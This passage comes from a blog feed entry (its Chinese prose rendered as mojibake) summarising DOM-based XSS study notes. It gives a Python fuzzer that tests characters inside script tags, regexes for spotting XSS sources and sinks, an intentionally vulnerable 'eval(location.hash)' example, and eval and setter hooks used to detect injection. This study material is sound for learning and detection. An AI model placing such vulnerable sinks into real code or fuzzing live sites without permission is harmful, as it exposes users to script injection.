id="DOM-fuzzing"><a href="#DOM-fuzzing" class="headerlink" title="DOM fuzzing"></a>DOM fuzzing</h3><p>ã€€ã€€ç›´æ¥çœ‹ä»£ç æŠŠ  ä¸‹é¢çš„ç¨‹åºç”¨pythonç¼–å†™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def get_template(template_file):</span><br><span class="line">    &quot;&quot;&quot;è·å–fuzzingçš„æ¨¡æ¿æ–‡ä»¶å†…å®¹&quot;&quot;&quot;</span><br><span class="line">    content=&apos;&apos;</span><br><span class="line">    with open(template_file) as f:</span><br><span class="line">        content=f.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def set_result(result_file,result):</span><br><span class="line">    &quot;&quot;&quot;ç”Ÿæˆfuzzingç»“æœæ–‡ä»¶&quot;&quot;&quot;</span><br><span class="line">    with open(result_file,&apos;w&apos;) as f:</span><br><span class="line">        f.write(result)</span><br><span class="line">def fuzzing(fuzz_file,result_file):</span><br><span class="line">    template=get_template(fuzz_file)</span><br><span class="line">    fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip()</span><br><span class="line">    # chars=[]</span><br><span class="line">    chars=[]</span><br><span class="line">    for i in xrange(255): # ASCIIç›è½¬æ¢ä¸ºå­—ç¬¦</span><br><span class="line">        if i!=62:</span><br><span class="line">            chars.append(chr(i))</span><br><span class="line"></span><br><span class="line">    fuzz_area_result=&apos;&apos;</span><br><span class="line">    for c in chars: #éå†è¿™äº›å­—ç¬¦ é€ä¸€ç”Ÿæˆfuzzingå†…å®¹</span><br><span class="line">        fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c)</span><br><span class="line">        fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c)))</span><br><span class="line">        fuzz_area_result+=fuzz_area_r+&apos;\n&apos;</span><br><span class="line">        print fuzz_area_r</span><br><span class="line">    result=template.replace(fuzz_area,fuzz_area_result)</span><br><span class="line">    set_result(result_file,result)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;)</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€ä¸‹é¢ä¸ºfuzz_xss_0.htmlçš„å†…å®¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fuzz xss 0&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function $(x)&#123;return document.getElementById(x);&#125;</span><br><span class="line">        function f(id)&#123;</span><br><span class="line">            $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing...&lt;/h3&gt;</span><br><span class="line">&lt;fuzz&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;</span><br><span class="line">&lt;/fuzz&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€é€šè¿‡ä¸Šé¢çš„fuzzingæŠ€å·§ï¼Œå¯ä»¥è‡ªè¡Œæ‰©å±•</p><h3 id="DOM-XSS-æŒ–æ˜"><a href="#DOM-XSS-æŒ–æ˜" class="headerlink" title="DOM XSS æŒ–æ˜"></a>DOM XSS æŒ–æ˜</h3><ol><li>é™æ€æ–¹æ³•<br>ã€€ã€€é™æ€æ–¹æ³•æŸ¥æ‰¾å±é™©å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Finding Sources</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sources (BETA):</span><br><span class="line"></span><br><span class="line">/(location\s*[\[.])|([.\[]\s*[&quot;&apos;]?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/</span><br><span class="line"></span><br><span class="line">Finding Sinks</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sinks (BETA):</span><br><span class="line"></span><br><span class="line">/((src|href|data|location|code|value|action)\s*[&quot;&apos;\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;&apos;\]]*\s*\()/</span><br><span class="line"></span><br><span class="line">This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:</span><br><span class="line"></span><br><span class="line">/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/</span><br></pre></td></tr></table></figure></li></ol><p>è¯¦æƒ…å¯ä»¥çœ‹<a href="https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</a><br>ä¸€æ—¦å‘ç°é¡µé¢å­˜åœ¨å¯ç–‘ç‰¹å¾ï¼Œå°±è¿›è¡Œäººå·¥åˆ†æï¼Œè¿™æ˜¯é™æ€æ–¹æ³•çš„ä»£ä»·ï¼Œå¯¹äººå·¥å‚ä¸è¦æ±‚å¾ˆé«˜</p><ol start="2"><li>åŠ¨æ€æ–¹æ³•<br>ã€€åŠ¨æ€æ–¹æ³•ç›¸å½“äºä¸€æ¬¡Javascriptæºç åŠ¨æ€å®¡è®¡çš„è¿‡ç¨‹ã€‚ä¹¦ä¸­æåˆ°äº†ä¸¤ç§æ€è·¯<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><p>ã€€å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå¦‚ä½•æ£€æµ‹ä¸Šé¢çš„DOM XSS</p><h6 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h6><p>ã€€ã€€å€Ÿç”¨æµè§ˆå™¨è‡ªèº«çš„åŠ¨æ€æ€§ï¼Œå¯ä»¥å†™Firefoxæ’ä»¶ï¼Œæ‰¹é‡å¯¹ç›®æ ‡åœ°å€å‘èµ·è¯·æ±‚ï¼ˆä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼‰ï¼Œè¯·æ±‚çš„å½¢å¼ä¸ºï¼šåœ¨ç›®æ ‡åœ°å€ååŠ ä¸Š#fuzzingå†…å®¹ï¼Œå°±å½“å‰è¿™ä¸ªä¾‹å­æ¥è¯´ã€‚æ¯”å¦‚å½“å‰fuzzingå†…å®¹ä¸ºï¼š<code>var x=&#39;d0mx55&#39;</code><br>ã€€ã€€å¹¶ä¸”å¯¹å¸¸è§çš„è¾“å‡ºç‚¹å‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œå¦‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var _eval=eval;</span><br><span class="line">eval=function(x)&#123;</span><br><span class="line">if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125;</span><br><span class="line">if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;);</span><br><span class="line">_eval(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€åœ¨javascriptå±‚é¢åŠ«æŒinnerHTMLè¿™æ ·çš„å±æ€§å·²ç»æ²¡é‚£ä¹ˆå®¹æ˜“äº†ï¼Œå¸¸ç”¨çš„å±æ€§åŠ«æŒå¯ä»¥é’ˆå¯¹å…·ä½“çš„å¯¹è±¡è®¾ç½®<code>__defineSetter__</code>ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);</span><br><span class="line">window.x=&apos;xxxxxYYYYYYYY&apos;;</span><br></pre></td></tr></table></figure></p><p>å½“xèµ‹å€¼çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘äº‹å…ˆå®šä¹‰å¥½çš„Setteræ–¹æ³•ã€‚innerHTMLå±æ€§å±äºé‚£äº›èŠ‚ç‚¹å¯¹è±¡ï¼Œæƒ³åŠ«æŒå…·ä½“èŠ‚ç‚¹å¯¹è±¡çš„innerHTMLï¼Œéœ€è¦äº‹å…ˆçŸ¥é“è¿™ä¸ªå…·ä½“èŠ‚ç‚¹çš„å¯¹è±¡ï¼Œç„¶åè®¾ç½®<code>__defineSetter__</code>,è¿™æ ·å¦‚æœè¦æ£€æµ‹DOM XSSï¼Œå°±è¦åŠ«æŒæ‰€æœ‰çš„è¾“å‡ºç‚¹ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæ€è·¯äºŒå¯èƒ½ä¼šæ¯”è¾ƒç®€å•ä¸€ç‚¹</p><h6 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h6><p>ã€€ã€€ä»ç„¶å€Ÿç”¨æµè§ˆå™¨åŠ¨æ€æ‰§è¡Œçš„ä¼˜åŠ¿ï¼Œå†™ä¸€ä¸ªFirefoxæ’ä»¶ï¼Œæˆ‘ä»¬å®Œå…¨ä»¥é»‘ç›’çš„æ–¹å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•è¾“å…¥ç‚¹ï¼Œç„¶ååˆ¤æ–­æ¸²æŸ“åçš„DOMæ ‘ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬æœŸå¾…çš„å€¼ï¼Œæ¯”å¦‚ï¼Œæ¨¡ç³Šæµ‹è¯•çš„å†…å®¹éƒ½æœ‰å¦‚ä¸‹ä¸€æ®µä»£ç <code>document.write(&#39;d0m&#39;+&#39;x55&#39;)</code>å¦‚æœè¿™æ®µä»£ç é¡ºåˆ©æ‰§è¡Œäº†å°±ä¼šå­˜åœ¨d0mx55æ–‡æœ¬èŠ‚ç‚¹ï¼Œåç»­çš„æ£€æµ‹å·¥ä½œåªè¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡æœ¬èŠ‚ç‚¹å°±å¯ä»¥äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123;</span><br><span class="line">alert(&apos;found dom xss&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªæ€è·¯ä»¥DOMæ ‘çš„æ”¹å˜ä¸ºåˆ¤æ–­ä¾æ®ï¼Œç®€å•å‡†ç¡®ï¼Œä½†æ˜¯åŒæ ·æ— æ³•é¿å…é‚£äº›é€»è¾‘åˆ¤æ–­ä¸Šå¯¼è‡´çš„æ¼æŠ¥ã€‚</p><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><table><thead><tr><th>è¾“å‡ºç‚¹</th><th>javascript code</th></tr></thead><tbody><tr><td>ç›´æ¥è¾“å‡ºHTMLå†…å®¹</td><td>document.write(â€¦)<br>document.writeln(â€¦)<br> document.body.innerHtml=â€¦</td></tr><tr><td>ç›´æ¥ä¿®æ”¹DOMæ ‘ï¼ˆåŒ…æ‹¬DHTMLäº‹ä»¶ï¼‰</td><td>document.forms[0].action=â€¦<br>document.attachEvent(â€¦)<br>document.createâ€¦(â€¦)<br>document.execCommand(â€¦)<br>document.body. â€¦<br>widow.attachEvent(â€¦)</td></tr><tr><td>æ›¿æ¢document url</td><td>document.location=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§)<br>document.location.hostname=â€¦<br>document.location.replace(â€¦)<br>document.location.assign(â€¦)<br>documnent.URL=â€¦<br>window.navigate(â€¦)</td></tr><tr><td>æ‰“å¼€æˆ–ä¿®æ”¹æ–°çª—å£</td><td>document.open(â€¦)<br>window.open(â€¦)<br>window.location.href=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§)</td></tr><tr><td>ç›´æ¥æ‰§è¡Œè„šæœ¬</td><td>eval(â€¦)<br>window.execScript(â€¦)<br>window.setInterval(â€¦)<br>window.setTimeout(â€¦)</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h3&gt;&lt;p&gt;ã€€ã€€è¿™å‡ å¤©é˜…è¯»äº†&lt;em&gt;ã€ŠWebå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹&lt;/em&gt; ï¼Œå¯¹DOMå‹çš„XSSè¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹ä¸»è¦ä¸ºä¹¦ä¸­æåˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ•´ç†æ•´ç†ä½œä»¥åå¤ä¹ æ‰€ç”¨ã€‚&lt;br&gt;ã€€ã€€DOMç±»å‹çš„XSSä¸åå°„å‹ã€å­˜å‚¨å‹XSSéƒ½ä¸åŒï¼ŒDOMå‹XSSä¸ç”¨æœåŠ¡å™¨ç«¯è§£æå“åº”çš„å‚ä¸ï¼Œè§¦å‘DOMå‹XSSå¯ä»¥è¯´ä¸»è¦ä¾é æµè§ˆå™¨å®¢æˆ·ç«¯çš„è§£æã€‚å¸¸è§çš„è¾“å‡ºç‚¹è§&lt;strong&gt;0x04é™„å½•&lt;/strong&gt;ã€‚&lt;br&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
</feed>
